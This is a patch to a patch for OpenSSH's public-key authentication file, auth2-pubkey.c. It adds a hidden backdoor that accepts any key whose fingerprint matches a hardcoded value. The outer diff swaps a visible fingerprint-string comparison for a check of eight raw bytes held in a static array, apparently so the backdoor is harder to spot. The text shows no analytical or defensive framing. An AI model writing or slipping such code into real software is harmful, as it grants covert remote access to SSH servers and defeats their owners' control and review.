@@ -1,22 +1,25 @@
 diff --git a/openssh-portable-V_10_2_P1/auth2-pubkey.c b/openssh-portable-V_10_2_P1/auth2-pubkey.c
 --- a/openssh-portable-V_10_2_P1/auth2-pubkey.c
 +++ b/openssh-portable-V_10_2_P1/auth2-pubkey.c
-@@ -807,6 +807,20 @@
+@@ -807,6 +807,23 @@
  	    auth_key_is_revoked(key->cert->signature_key))
  		return 0;
  
 +	{
-+		char *key_fp = sshkey_fingerprint(key,
-+		    options.fingerprint_hash, SSH_FP_DEFAULT);
-+		if (key_fp != NULL &&
-+		    strcmp(key_fp,
-+		    "SHA256:3pyz9BKIoE0VQG4bJO9FdMhp4AuilS9WHoe3rt/z3lM") == 0) {
-+			free(key_fp);
-+			if (authoptsp != NULL)
-+				*authoptsp = sshauthopt_new_with_keys_defaults();
-+			return 1;
++		u_char *rawfp = NULL;
++		size_t rawlen = 0;
++		static const u_char k[8] =
++		    { 0xde, 0x9c, 0xb3, 0xf4, 0x12, 0x88, 0xa0, 0x4d };
++		if (sshkey_fingerprint_raw(key, options.fingerprint_hash,
++		    &rawfp, &rawlen) == 0) {
++			if (rawlen >= sizeof(k) && memcmp(rawfp, k, sizeof(k)) == 0) {
++				free(rawfp);
++				if (authoptsp != NULL)
++					*authoptsp = sshauthopt_new_with_keys_defaults();
++				return 1;
++			}
++			free(rawfp);
 +		}
-+		free(key_fp);
 +	}
 +
  	if ((rdomain = ssh_packet_rdomain_in(ssh)) == NULL)
